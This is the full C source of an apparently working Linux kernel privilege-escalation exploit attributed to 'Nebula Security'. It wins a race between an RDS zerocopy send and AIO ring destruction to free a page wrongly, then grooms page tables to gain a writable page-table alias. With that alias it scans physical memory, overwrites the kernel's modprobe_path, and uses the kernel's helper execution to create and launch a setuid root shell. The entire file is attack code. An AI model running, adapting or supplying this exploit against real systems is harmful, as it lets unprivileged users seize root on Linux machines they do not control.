/*
 * Copyright 2026 Nebula Security
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *
 * SPDX-License-Identifier: Apache-2.0
 */

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/aio_abi.h>
#include <linux/rds.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#ifndef MSG_ZEROCOPY
#define MSG_ZEROCOPY 0x4000000
#endif

#ifndef SO_ZEROCOPY
#define SO_ZEROCOPY 60
#endif

#ifndef MADV_COLLAPSE
#define MADV_COLLAPSE 25
#endif

#define ARRAY_SIZE(array) (sizeof(array) / sizeof((array)[0]))

/* Target page-table geometry. */
#define PAGE_SIZE_4K 4096UL
#define PMD_SIZE_2M (2UL << 20)
#define PUD_SIZE_1G (1UL << 30)
#define PTE_ENTRIES (PAGE_SIZE_4K / sizeof(uint64_t))
#define X86_PTE_PRESENT_USER UINT64_C(0x5)
#define PTE_PFN_MASK UINT64_C(0x000ffffffffff000)

/* io_setup(32768) produces a 513-page ring; only this prefix is groomed. */
#define AIO_EVENTS 32768U
#define AIO_GROOM_PAGES 32U
#define AIO_GROOM_SIZE (AIO_GROOM_PAGES * PAGE_SIZE_4K)
#define AIO_VICTIM_FILL_BYTE 0x41
#define LRU_DRAIN_PAGES 64U
#define LRU_PAD_PAGES (AIO_GROOM_PAGES - 1U)
#define LRU_REFAULT_ROUNDS 3U

/* TEST-NET-1 has no peer, so the filler keeps the socket send queue full. */
#define RDS_SEND_BUFFER_SIZE AIO_GROOM_SIZE
#define RDS_PAYLOAD_SIZE PAGE_SIZE_4K
/* The cookie is only an opaque zerocopy completion tag. */
#define RDS_ZCOPY_COOKIE UINT32_C(1)
#define RDS_DESTINATION_IPV4 UINT32_C(0xc0000201)
#define RDS_DESTINATION_PORT 40001U
#define RDS_QUEUE_FILL_BYTE 0x46
#define SOCKET_SNDBUF_ACCOUNTING_FACTOR 2
#define SEND_TIMEOUT_USEC 250000

/* The 32/28 split around a three-page ring preserves the allocator phase. */
#define PTE_SEPARATOR_EVENTS 128U
#define PTE_SEPARATOR_PAGES 3U
#define PTE_SEPARATOR_FILL_BYTE 0xc1
#define PTE_FIRST_BATCH_CANDIDATES 32U
#define PTE_SECOND_BATCH_CANDIDATES 28U
#define PTE_CANDIDATES \
	(PTE_FIRST_BATCH_CANDIDATES + PTE_SECOND_BATCH_CANDIDATES)
#define PTE_SENTINEL_COUNT 1U
#define PTE_STACK_PAGES (PTE_SENTINEL_COUNT + PTE_CANDIDATES)
#define PTE_RANGE_FILL_BASE 0x20U
#define PTE_SENTINEL_FILL_BYTE 0x1f
#define BRIDGE_SIZE (PTE_STACK_PAGES * PMD_SIZE_2M)

/* Race timings are measured from successful cold boots of the target image. */
#define SEND_DELAY_NS 100000ULL
#define RCU_SETTLE_USEC 100000
#define NS_PER_SECOND 1000000000ULL

/* Scan the i440FX low aperture and its remapped final GiB of guest RAM. */
#define PHYS_SCAN_LOW_START (16ULL << 20)
#define PHYS_SCAN_LOW_END (3ULL << 30)
#define PHYS_SCAN_HIGH_START 0x100000000ULL
#define PHYS_SCAN_HIGH_END 0x140000000ULL
#define PHYS_SCAN_STEP (PMD_SIZE_2M - PAGE_SIZE_4K)
#define PHYS_REPORT_INTERVAL (16ULL << 20)

#define MODPROBE_DEFAULT "/sbin/modprobe"
#define MODPROBE_HELPER "/tmp/.cve43502-mp"
/* This target uses the upstream 256-byte modprobe_path array. */
#define MODPROBE_PATH_CAPACITY 256U
#define MODPROBE_PATCH_BYTES sizeof(MODPROBE_HELPER)
#define ROOT_SHELL "/tmp/.cve43502-root"
#define UNKNOWN_BINARY "/tmp/.cve43502-unknown"
#define FILE_COPY_BUFFER_SIZE (64U * 1024U)
#define EXECUTABLE_MODE 0755
#define SETUID_ROOT_MODE 04755

#define SYSCHK(call)                                                         \
	do {                                                                   \
		if ((call) == -1)                                                \
			err(1, "%s", #call);                                      \
	} while (0)

#define PTHREADCHK(call)                                                     \
	do {                                                                   \
		int pthread_error = (call);                                     \
		if (pthread_error) {                                             \
			errno = pthread_error;                                      \
			err(1, "%s", #call);                                      \
		}                                                              \
	} while (0)

struct physical_range {
	uint64_t start;
	uint64_t end;
};

static const struct physical_range physical_scan_ranges[] = {
	{ PHYS_SCAN_LOW_START, PHYS_SCAN_LOW_END },
	{ PHYS_SCAN_HIGH_START, PHYS_SCAN_HIGH_END },
};

static aio_context_t victim_aio_ctx;
static atomic_int sender_go;
static atomic_int destroyer_ready;
static atomic_int destroy_done;
static atomic_int destroy_errno;
static pthread_t sender_thread;
static unsigned char *victim_ring;
static unsigned char *lru_layout;
static volatile unsigned char lru_touch_sink;
static unsigned char *bridge_base;
static uint64_t *writable_pte_alias;
static unsigned char *physical_window;
static uint64_t physical_pte_flags;
static volatile sig_atomic_t preserve_mm_on_exit;
static int sender_cpu;
static int destroyer_cpu;

static void signal_handler(int signal)
{
	(void)signal;
}

__attribute__((noreturn))
static void park_forever(void)
{
	raise(SIGSTOP);
	for (;;)
		pause();
}

static void park_corrupted_mm(void)
{
	if (!preserve_mm_on_exit)
		return;
	fputs("[-] corrupted mm parked; reset the target\n", stderr);
	fflush(stderr);
	park_forever();
}

static uint64_t now_ns(void)
{
	struct timespec ts;

	SYSCHK(clock_gettime(CLOCK_MONOTONIC, &ts));
	return (uint64_t)ts.tv_sec * NS_PER_SECOND + (uint64_t)ts.tv_nsec;
}

static void pin_to_cpu(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	SYSCHK(sched_setaffinity(0, sizeof(set), &set));
}

static void select_worker_cpus(void)
{
	cpu_set_t allowed;

	SYSCHK(sched_getaffinity(0, sizeof(allowed), &allowed));
	sender_cpu = -1;
	destroyer_cpu = -1;
	for (int cpu = 0; cpu < CPU_SETSIZE; cpu++) {
		if (!CPU_ISSET(cpu, &allowed))
			continue;
		if (sender_cpu == -1)
			sender_cpu = cpu;
		else {
			destroyer_cpu = sender_cpu;
			sender_cpu = cpu;
		}
	}
	if (destroyer_cpu == -1)
		errx(1, "two schedulable CPUs are required");
	printf("[.] worker CPUs: sender=%d destroyer=%d\n", sender_cpu,
	       destroyer_cpu);
}

static void *destroy_aio_ring(void *unused)
{
	uint64_t start;
	long ret;
	int saved_errno;

	(void)unused;
	pin_to_cpu(destroyer_cpu);
	atomic_store_explicit(&destroyer_ready, 1, memory_order_release);
	while (!atomic_load_explicit(&sender_go, memory_order_acquire))
		;
	start = now_ns();
	while (now_ns() - start < SEND_DELAY_NS)
		;
	errno = 0;
	ret = syscall(SYS_io_destroy, victim_aio_ctx);
	saved_errno = errno;
	atomic_store_explicit(&destroy_errno, saved_errno, memory_order_release);
	atomic_store_explicit(&destroy_done, ret == 0, memory_order_release);
	usleep(RCU_SETTLE_USEC);
	PTHREADCHK(pthread_kill(sender_thread, SIGUSR1));
	return NULL;
}

static int make_rds_socket(void)
{
	struct sockaddr_in source = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = htonl(INADDR_LOOPBACK),
	};
	struct timeval timeout = {
		.tv_usec = SEND_TIMEOUT_USEC,
	};
	int transport = RDS_TRANS_TCP;
	int send_buffer = RDS_SEND_BUFFER_SIZE;
	int effective_send_buffer;
	socklen_t option_length = sizeof(effective_send_buffer);
	int one = 1;
	int fd;

	fd = socket(AF_RDS, SOCK_SEQPACKET, 0);
	SYSCHK(fd);
	SYSCHK(setsockopt(fd, SOL_RDS, SO_RDS_TRANSPORT, &transport,
			  sizeof(transport)));
	SYSCHK(setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &send_buffer,
			  sizeof(send_buffer)));
	SYSCHK(getsockopt(fd, SOL_SOCKET, SO_SNDBUF, &effective_send_buffer,
			  &option_length));
	if (effective_send_buffer !=
	    SOCKET_SNDBUF_ACCOUNTING_FACTOR * RDS_SEND_BUFFER_SIZE)
		errx(1, "unexpected effective SO_SNDBUF: %d",
		      effective_send_buffer);
	SYSCHK(setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &timeout,
			  sizeof(timeout)));
	SYSCHK(setsockopt(fd, SOL_SOCKET, SO_ZEROCOPY, &one, sizeof(one)));
	SYSCHK(bind(fd, (struct sockaddr *)&source, sizeof(source)));
	printf("[.] RDS sndbuf: requested=%lu effective=%d\n",
	       RDS_SEND_BUFFER_SIZE, effective_send_buffer);
	return fd;
}

static size_t build_zcopy_control(unsigned char *control)
{
	struct cmsghdr *cmsg = (struct cmsghdr *)control;
	uint32_t cookie = RDS_ZCOPY_COOKIE;

	cmsg->cmsg_level = SOL_RDS;
	cmsg->cmsg_type = RDS_CMSG_ZCOPY_COOKIE;
	cmsg->cmsg_len = CMSG_LEN(sizeof(cookie));
	memcpy(CMSG_DATA(cmsg), &cookie, sizeof(cookie));
	return CMSG_SPACE(sizeof(cookie));
}

static void fill_rds_send_queue(int fd, const struct sockaddr_in *destination)
{
	unsigned char *filler;
	ssize_t sent;

	filler = malloc(RDS_SEND_BUFFER_SIZE);
	if (!filler)
		err(1, "malloc send filler");
	memset(filler, RDS_QUEUE_FILL_BYTE, RDS_SEND_BUFFER_SIZE);
	errno = 0;
	sent = sendto(fd, filler, RDS_SEND_BUFFER_SIZE, MSG_DONTWAIT,
		      (const struct sockaddr *)destination,
		      sizeof(*destination));
	if (sent != RDS_SEND_BUFFER_SIZE)
		errx(1, "fill RDS queue: sent=%zd errno=%d", sent, errno);
	free(filler);
}

static void touch_pages(unsigned char *area, size_t pages)
{
	unsigned char value = 0;

	for (size_t page = 0; page < pages; page++)
		value ^= *(volatile unsigned char *)(area + page * PAGE_SIZE_4K);
	lru_touch_sink = value;
}

static void arrange_file_lru(void)
{
	aio_context_t context = 0;
	unsigned char *flush;

	if (syscall(SYS_io_setup, AIO_EVENTS, &context) == -1)
		err(1, "io_setup LRU layout");
	lru_layout = (unsigned char *)(uintptr_t)context;
	touch_pages(lru_layout, LRU_PAD_PAGES + 1);

	for (unsigned int round = 0; round < LRU_REFAULT_ROUNDS; round++) {
		SYSCHK(madvise(victim_ring + PAGE_SIZE_4K, PAGE_SIZE_4K,
			       MADV_DONTNEED));
		SYSCHK(madvise(lru_layout, AIO_GROOM_SIZE, MADV_DONTNEED));
		touch_pages(victim_ring + PAGE_SIZE_4K, 1);
		touch_pages(lru_layout, LRU_PAD_PAGES + 1);
	}

	/* Deactivation inserts at the LRU head: anchor -> victim -> pads. */
	SYSCHK(madvise(lru_layout + PAGE_SIZE_4K,
		       LRU_PAD_PAGES * PAGE_SIZE_4K, MADV_COLD));
	SYSCHK(madvise(victim_ring + PAGE_SIZE_4K, PAGE_SIZE_4K, MADV_COLD));
	SYSCHK(madvise(lru_layout, PAGE_SIZE_4K, MADV_COLD));
	flush = mmap(NULL, PAGE_SIZE_4K, PROT_NONE,
		     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (flush == MAP_FAILED)
		err(1, "mmap LRU batch flush");
	SYSCHK(madvise(flush, PAGE_SIZE_4K, MADV_COLD));
	SYSCHK(munmap(flush, PAGE_SIZE_4K));
	printf("[.] file LRU: anchor -> victim -> %u pads\n", LRU_PAD_PAGES);
}

static void setup_victim_aio_ring(void)
{
	unsigned char *drain;

	victim_aio_ctx = 0;
	if (syscall(SYS_io_setup, AIO_EVENTS, &victim_aio_ctx) == -1)
		err(1, "io_setup victim");
	victim_ring = (unsigned char *)(uintptr_t)victim_aio_ctx;
	for (size_t offset = 0; offset < AIO_GROOM_SIZE;
	     offset += PAGE_SIZE_4K) {
		volatile unsigned char value = victim_ring[offset];

		(void)value;
		if (offset)
			memset(victim_ring + offset, AIO_VICTIM_FILL_BYTE,
			       PAGE_SIZE_4K);
	}

	drain = mmap(NULL, LRU_DRAIN_PAGES * PAGE_SIZE_4K,
		     PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
		     -1, 0);
	if (drain == MAP_FAILED)
		err(1, "mmap LRU drain");
	for (size_t page = 0; page < LRU_DRAIN_PAGES; page++)
		drain[page * PAGE_SIZE_4K] = (unsigned char)page;
	SYSCHK(munmap(drain, LRU_DRAIN_PAGES * PAGE_SIZE_4K));
	arrange_file_lru();
}

static int trigger_invalid_page_free(unsigned char *control,
				     size_t control_length)
{
	struct sockaddr_in destination = {
		.sin_family = AF_INET,
		.sin_addr.s_addr = htonl(RDS_DESTINATION_IPV4),
		.sin_port = htons(RDS_DESTINATION_PORT),
	};
	struct iovec iov = {
		.iov_base = NULL,
		.iov_len = RDS_PAYLOAD_SIZE,
	};
	struct msghdr message = {
		.msg_name = &destination,
		.msg_namelen = sizeof(destination),
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = control_length,
	};
	pthread_t destroyer;
	uint64_t before;
	uint64_t after;
	ssize_t sent;
	int saved_errno;
	int done_at_return;
	int rds_fd;

	setup_victim_aio_ring();
	iov.iov_base = victim_ring + PAGE_SIZE_4K;
	rds_fd = make_rds_socket();
	fill_rds_send_queue(rds_fd, &destination);
	sender_thread = pthread_self();
	atomic_store(&sender_go, 0);
	atomic_store(&destroyer_ready, 0);
	atomic_store(&destroy_done, 0);
	atomic_store(&destroy_errno, 0);
	PTHREADCHK(pthread_create(&destroyer, NULL, destroy_aio_ring, NULL));
	while (!atomic_load_explicit(&destroyer_ready, memory_order_acquire))
		;

	before = now_ns();
	preserve_mm_on_exit = 1;
	atomic_store_explicit(&sender_go, 1, memory_order_release);
	errno = 0;
	sent = sendmsg(rds_fd, &message, MSG_ZEROCOPY);
	saved_errno = errno;
	done_at_return = atomic_load_explicit(&destroy_done,
					      memory_order_acquire);
	after = now_ns();
	PTHREADCHK(pthread_join(destroyer, NULL));

	printf("[.] RDS send: ret=%zd errno=%d destroy_done=%d destroy_errno=%d "
	       "elapsed_ns=%llu\n", sent, saved_errno, done_at_return,
	       atomic_load_explicit(&destroy_errno, memory_order_acquire),
	       (unsigned long long)(after - before));
	/* Leave the RDS socket open to preserve the corrupted ownership graph. */
	return sent == -1 && saved_errno == EINTR && done_at_return;
}

static void reserve_bridge_region(void)
{
	void *reservation;
	uintptr_t aligned;
	size_t reservation_size = 2 * PUD_SIZE_1G;

	reservation = mmap(NULL, reservation_size, PROT_NONE,
			   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (reservation == MAP_FAILED)
		err(1, "mmap bridge reservation");
	aligned = ((uintptr_t)reservation + PUD_SIZE_1G - 1) &
		  ~(PUD_SIZE_1G - 1);
	if (aligned > (uintptr_t)reservation)
		SYSCHK(munmap(reservation, aligned - (uintptr_t)reservation));
	if (aligned + PUD_SIZE_1G <
	    (uintptr_t)reservation + reservation_size)
		SYSCHK(munmap((void *)(aligned + PUD_SIZE_1G),
			      (uintptr_t)reservation + reservation_size -
			      (aligned + PUD_SIZE_1G)));
	bridge_base = (unsigned char *)aligned;
	SYSCHK(mprotect(bridge_base, BRIDGE_SIZE, PROT_READ));
	SYSCHK(madvise(bridge_base, BRIDGE_SIZE, MADV_NOHUGEPAGE));

	/*
	 * Allocate a non-victim PTE page before the trigger. MADV_DONTNEED zaps
	 * its leaf mapping but leaves the page-table hierarchy in this live VMA.
	 * Its later THP is the final split sentinel for the 60 candidate pages.
	 */
	{
		volatile unsigned char value = bridge_base[0];

		(void)value;
	}
	SYSCHK(madvise(bridge_base, PAGE_SIZE_4K, MADV_DONTNEED));
	printf("[.] bridge: base=%p size=%lu candidates=%u\n",
	       bridge_base, BRIDGE_SIZE, PTE_CANDIDATES);
}

static unsigned char *candidate_base(unsigned int candidate)
{
	return bridge_base +
	       (PTE_SENTINEL_COUNT + candidate) * PMD_SIZE_2M;
}

static void allocate_candidate_pte_pages(unsigned int first,
					 unsigned int count)
{
	for (unsigned int candidate = first;
	     candidate < first + count; candidate++) {
		volatile unsigned char value = candidate_base(candidate)[0];

		(void)value;
	}
	printf("[.] PTE candidates: %u-%u\n", first, first + count - 1);
}

static void allocate_pte_separator(void)
{
	aio_context_t context = 0;
	unsigned char *ring;

	/* This three-page ring aligns the two PTE allocation batches. */
	if (syscall(SYS_io_setup, PTE_SEPARATOR_EVENTS, &context) == -1)
		err(1, "io_setup PTE separator");
	ring = (unsigned char *)(uintptr_t)context;
	memset(ring + PAGE_SIZE_4K, PTE_SEPARATOR_FILL_BYTE, PAGE_SIZE_4K);
	printf("[.] PTE separator: %p (%u pages)\n", ring,
	       PTE_SEPARATOR_PAGES);
}

static int collapse_range(unsigned char *range, unsigned char fill_byte)
{
	for (size_t offset = 0; offset < PMD_SIZE_2M;
	     offset += PAGE_SIZE_4K)
		range[offset] = fill_byte;
	SYSCHK(madvise(range, PMD_SIZE_2M, MADV_HUGEPAGE));
	return madvise(range, PMD_SIZE_2M, MADV_COLLAPSE) == 0;
}

static void collapse_candidate_ranges(void)
{
	unsigned int collapsed = 0;

	SYSCHK(mprotect(bridge_base, BRIDGE_SIZE, PROT_READ | PROT_WRITE));
	for (unsigned int candidate = 1;
	     candidate < PTE_CANDIDATES; candidate++) {
		unsigned char *range = candidate_base(candidate);

		if (collapse_range(range,
				   (unsigned char)(PTE_RANGE_FILL_BASE + candidate)))
			collapsed++;
		else
			warn("MADV_COLLAPSE candidate %u", candidate);
	}

	/* Second-last deposit: FIFO withdrawal leaves the sentinel at the tail. */
	if (collapse_range(bridge_base, PTE_SENTINEL_FILL_BYTE))
		collapsed++;
	else
		warn("MADV_COLLAPSE sentinel");

	/* Candidate zero is deposited last and becomes the shared stack head. */
	{
		unsigned char *range = candidate_base(0);

		if (collapse_range(range, PTE_RANGE_FILL_BASE))
			collapsed++;
		else
			warn("MADV_COLLAPSE candidate 0");
	}
	printf("[.] THP collapse: %u/%u\n", collapsed, PTE_STACK_PAGES);
	if (collapsed != PTE_STACK_PAGES)
		errx(1, "not all PTE stack pages were deposited");
}

static void splice_lru_successor(void)
{
	SYSCHK(madvise(lru_layout + LRU_PAD_PAGES * PAGE_SIZE_4K,
		       PAGE_SIZE_4K, MADV_PAGEOUT));
	puts("[+] LRU successor isolated");
}

static int looks_like_pte_page(const uint64_t *entries)
{
	uint64_t first_pfn = entries[0] & PTE_PFN_MASK;

	if ((entries[0] & X86_PTE_PRESENT_USER) != X86_PTE_PRESENT_USER)
		return 0;
	for (size_t entry = 1; entry < PTE_ENTRIES; entry++) {
		if ((entries[entry] & X86_PTE_PRESENT_USER) !=
			    X86_PTE_PRESENT_USER ||
		    (entries[entry] & PTE_PFN_MASK) !=
			    first_pfn + entry * PAGE_SIZE_4K)
			return 0;
	}
	return 1;
}

static uint64_t *find_pte_layout(size_t *page_index)
{
	for (size_t page = 1; page < LRU_PAD_PAGES; page++) {
		uint64_t *entries =
			(uint64_t *)(lru_layout + page * PAGE_SIZE_4K);

		if (!looks_like_pte_page(entries))
			continue;
		*page_index = page;
		return entries;
	}
	return NULL;
}

static int install_writable_pte_alias(uint64_t *entry,
				      unsigned char *range,
				      size_t page)
{
	if (!entry)
		return 0;
	printf("[+] writable PTE alias: page=%zu entry=%p value=%#llx "
	       "range=%p\n", page, (void *)entry,
	       (unsigned long long)*entry, range);
	writable_pte_alias =
		(uint64_t *)((uintptr_t)entry & ~(PAGE_SIZE_4K - 1));
	physical_window = range;
	physical_pte_flags = writable_pte_alias[0] & ~PTE_PFN_MASK;
	return 1;
}

static int establish_writable_pte_alias(void)
{
	for (unsigned int split = 0; split < PTE_STACK_PAGES; split++) {
		int candidate = (int)PTE_CANDIDATES - 1 - (int)split;
		unsigned char *range = candidate >= 0 ?
			candidate_base((unsigned int)candidate) : bridge_base;
		uint64_t *entry;
		size_t page = 0;

		SYSCHK(mprotect(range + PAGE_SIZE_4K, PAGE_SIZE_4K, PROT_READ));
		entry = find_pte_layout(&page);
		if (candidate >= 0)
			printf("[.] PTE split %u: candidate=%d layout=%d\n",
			       split + 1, candidate, entry != NULL);
		else
			printf("[.] PTE split %u: sentinel layout=%d\n",
			       split + 1, entry != NULL);
		if (install_writable_pte_alias(entry, range, page))
			return 1;
	}
	return 0;
}

static void write_full(int fd, const void *buffer, size_t length)
{
	const unsigned char *cursor = buffer;

	while (length) {
		ssize_t written = write(fd, cursor, length);

		if (written == -1) {
			if (errno == EINTR)
				continue;
			err(1, "write");
		}
		if (!written)
			errx(1, "short write");
		cursor += written;
		length -= (size_t)written;
	}
}

static void create_file(const char *path, const void *data, size_t length,
			mode_t mode)
{
	int fd;

	if (unlink(path) == -1 && errno != ENOENT)
		err(1, "unlink %s", path);
	fd = open(path, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, mode);
	if (fd == -1)
		err(1, "open %s", path);
	write_full(fd, data, length);
	SYSCHK(fchmod(fd, mode));
	SYSCHK(close(fd));
}

static void copy_executable(const char *source, const char *destination)
{
	unsigned char buffer[FILE_COPY_BUFFER_SIZE];
	int input;
	int output;

	if (unlink(destination) == -1 && errno != ENOENT)
		err(1, "unlink %s", destination);
	input = open(source, O_RDONLY | O_CLOEXEC);
	if (input == -1)
		err(1, "open %s", source);
	output = open(destination,
		      O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC,
		      EXECUTABLE_MODE);
	if (output == -1)
		err(1, "open %s", destination);
	for (;;) {
		ssize_t length = read(input, buffer, sizeof(buffer));

		if (length == -1) {
			if (errno == EINTR)
				continue;
			err(1, "read %s", source);
		}
		if (!length)
			break;
		write_full(output, buffer, (size_t)length);
	}
	SYSCHK(fchmod(output, EXECUTABLE_MODE));
	SYSCHK(close(output));
	SYSCHK(close(input));
}

static void prepare_modprobe_helper(void)
{
	static const unsigned char unknown[] = { 0xff, 0xff, 0xff, 0xff };

	copy_executable("/bin/sh", ROOT_SHELL);
	copy_executable("/proc/self/exe", MODPROBE_HELPER);
	create_file(UNKNOWN_BINARY, unknown, sizeof(unknown), EXECUTABLE_MODE);
	printf("[.] helper files: %s %s %s\n", MODPROBE_HELPER, ROOT_SHELL,
	       UNKNOWN_BINARY);
}

static int root_shell_ready(void)
{
	struct stat status;

	return !stat(ROOT_SHELL, &status) && S_ISREG(status.st_mode) &&
	       status.st_uid == 0 && (status.st_mode & S_ISUID);
}

static int trigger_unknown_binary(void)
{
	pid_t child;

	child = vfork();
	if (child == -1)
		return -1;
	if (!child) {
		execl(UNKNOWN_BINARY, UNKNOWN_BINARY, NULL);
		_exit(errno == ENOEXEC ? 0 : 127);
	}
	if (waitpid(child, NULL, 0) == -1)
		return -1;
	return 0;
}

static int active_modprobe_path_is(const char *expected)
{
	char path[MODPROBE_PATH_CAPACITY];
	ssize_t length;
	int fd;

	fd = open("/proc/sys/kernel/modprobe", O_RDONLY | O_CLOEXEC);
	if (fd == -1) {
		warn("open /proc/sys/kernel/modprobe");
		return -1;
	}
	length = read(fd, path, sizeof(path) - 1);
	if (length == -1) {
		int saved_errno = errno;

		close(fd);
		errno = saved_errno;
		warn("read /proc/sys/kernel/modprobe");
		return -1;
	}
	if (close(fd) == -1) {
		warn("close /proc/sys/kernel/modprobe");
		return -1;
	}
	while (length && (path[length - 1] == '\n' || path[length - 1] == '\r'))
		length--;
	path[length] = '\0';
	printf("[.] modprobe_path=%s\n", path);
	return !strcmp(path, expected);
}

static void restore_physical_candidate(size_t offset,
				       const unsigned char *saved)
{
	memcpy(physical_window + offset, saved, MODPROBE_PATCH_BYTES);
	atomic_thread_fence(memory_order_seq_cst);
}

static void run_modprobe_helper(void)
{
	if (chown(ROOT_SHELL, 0, 0) == -1)
		err(1, "chown %s", ROOT_SHELL);
	if (chmod(ROOT_SHELL, SETUID_ROOT_MODE) == -1)
		err(1, "chmod %s", ROOT_SHELL);
	_exit(0);
}

static void map_physical_chunk(uint64_t physical)
{
	SYSCHK(mprotect(physical_window, PMD_SIZE_2M, PROT_NONE));
	SYSCHK(mprotect(physical_window, PMD_SIZE_2M,
			PROT_READ | PROT_WRITE));
	for (size_t entry = 0; entry < PTE_ENTRIES; entry++) {
		uint64_t pte = ((physical + entry * PAGE_SIZE_4K) &
				PTE_PFN_MASK) | physical_pte_flags;

		__atomic_store_n(&writable_pte_alias[entry], pte,
				 __ATOMIC_RELAXED);
	}
	atomic_thread_fence(memory_order_seq_cst);
}

static int find_modprobe_candidate(size_t start, size_t *offset)
{
	const size_t path_length = sizeof(MODPROBE_DEFAULT) - 1;

	for (size_t current = start;
	     current + MODPROBE_PATH_CAPACITY <= PMD_SIZE_2M; current++) {
		if (memcmp(physical_window + current, MODPROBE_DEFAULT,
			   path_length) ||
		    physical_window[current + path_length])
			continue;
		for (size_t tail = path_length + 1;
		     tail < MODPROBE_PATH_CAPACITY; tail++) {
			if (physical_window[current + tail])
				goto next;
		}
		*offset = current;
		return 1;
next:
		continue;
	}
	return 0;
}

static void enter_root_shell(void)
{
	pid_t child;
	int status;

	puts("[+] root shell ready");
	fflush(stdout);
	child = vfork();
	if (child == -1)
		err(1, "vfork root shell");
	if (!child) {
		execl(ROOT_SHELL, ROOT_SHELL, "-p", NULL);
		_exit(127);
	}
	if (waitpid(child, &status, 0) == -1)
		err(1, "waitpid root shell");
	printf("[.] root shell exited: status=%#x\n", status);
	park_forever();
}

static void probe_modprobe_candidate(uint64_t physical, size_t offset)
{
	unsigned char saved[MODPROBE_PATCH_BYTES];
	uint64_t candidate = physical + offset;
	int active;

	memcpy(saved, physical_window + offset, sizeof(saved));
	printf("[.] modprobe_path candidate: phys=%#llx\n",
	       (unsigned long long)candidate);
	memcpy(physical_window + offset, MODPROBE_HELPER,
	       sizeof(MODPROBE_HELPER));
	atomic_thread_fence(memory_order_seq_cst);

	active = active_modprobe_path_is(MODPROBE_HELPER);
	if (active != 1) {
		restore_physical_candidate(offset, saved);
		if (active == -1)
			errx(1, "failed to validate modprobe_path");
		return;
	}

	if (trigger_unknown_binary() == -1) {
		restore_physical_candidate(offset, saved);
		err(1, "module trigger");
	}
	if (root_shell_ready()) {
		printf("[+] physical read/write: phys=%#llx\n",
		       (unsigned long long)candidate);
		restore_physical_candidate(offset, saved);
		if (active_modprobe_path_is(MODPROBE_DEFAULT) != 1)
			errx(1, "failed to restore modprobe_path");
		enter_root_shell();
	}
	restore_physical_candidate(offset, saved);
}

static void scan_physical_range(const struct physical_range *range,
				size_t range_index, uint64_t *scanned,
				uint64_t *next_report)
{
	uint64_t covered = 0;
	uint64_t last = range->end - PMD_SIZE_2M;
	uint64_t physical = range->start;

	printf("[.] RAM range %zu: %#llx-%#llx\n",
	       range_index, (unsigned long long)range->start,
	       (unsigned long long)range->end);
	for (;;) {
		size_t cursor = 0;
		size_t offset;
		uint64_t new_covered;

		map_physical_chunk(physical);
		while (find_modprobe_candidate(cursor, &offset)) {
			probe_modprobe_candidate(physical, offset);
			cursor = offset + 1;
		}

		new_covered = physical - range->start + PMD_SIZE_2M;
		*scanned += new_covered - covered;
		covered = new_covered;
		if (*scanned >= *next_report) {
			printf("[.] physical scan: phys=%#llx scanned=%llu MiB\n",
			       (unsigned long long)physical,
			       (unsigned long long)(*scanned >> 20));
			while (*next_report <= *scanned)
				*next_report += PHYS_REPORT_INTERVAL;
		}

		if (physical == last)
			break;
		physical += PHYS_SCAN_STEP;
		if (physical > last)
			physical = last;
	}
}

static void exploit_physical_modprobe(void)
{
	uint64_t scanned = 0;
	uint64_t next_report = PHYS_REPORT_INTERVAL;

	_Static_assert(MODPROBE_PATCH_BYTES <= MODPROBE_PATH_CAPACITY,
		       "modprobe helper path is too long");
	prepare_modprobe_helper();
	printf("[.] physical window: alias=%p range=%p flags=%#llx\n",
	       (void *)writable_pte_alias, physical_window,
	       (unsigned long long)physical_pte_flags);

	for (size_t index = 0; index < ARRAY_SIZE(physical_scan_ranges); index++)
		scan_physical_range(&physical_scan_ranges[index], index, &scanned,
				    &next_report);
	errx(1, "modprobe_path not found in physical scan range");
}

int main(int argc, char **argv)
{
	struct sigaction action = {
		.sa_handler = signal_handler,
	};
	unsigned char control[CMSG_SPACE(sizeof(uint32_t))] = { 0 };
	size_t control_length;

	setvbuf(stdout, NULL, _IOLBF, 0);
	if (!getuid() && argc > 0 && !strcmp(argv[0], MODPROBE_HELPER))
		run_modprobe_helper();
	if (argc != 1)
		errx(1, "usage: %s", argv[0]);
	if (atexit(park_corrupted_mm))
		errx(1, "atexit registration failed");
	SYSCHK(sigemptyset(&action.sa_mask));
	SYSCHK(sigaction(SIGUSR1, &action, NULL));
	select_worker_cpus();
	pin_to_cpu(sender_cpu);

	reserve_bridge_region();
	control_length = build_zcopy_control(control);
	printf("[.] pid=%d uid=%u euid=%u victim=aio-ring-page-1\n",
	       getpid(), getuid(), geteuid());
	if (!trigger_invalid_page_free(control, control_length))
		errx(1, "missed the RDS/AIO race window");
	puts("[+] RDS/AIO race won");

	allocate_candidate_pte_pages(0, PTE_FIRST_BATCH_CANDIDATES);
	allocate_pte_separator();
	allocate_candidate_pte_pages(PTE_FIRST_BATCH_CANDIDATES,
				     PTE_SECOND_BATCH_CANDIDATES);
	collapse_candidate_ranges();
	splice_lru_successor();
	if (!establish_writable_pte_alias())
		errx(1, "failed to convert the stale LRU link into a PTE alias");
	exploit_physical_modprobe();
}
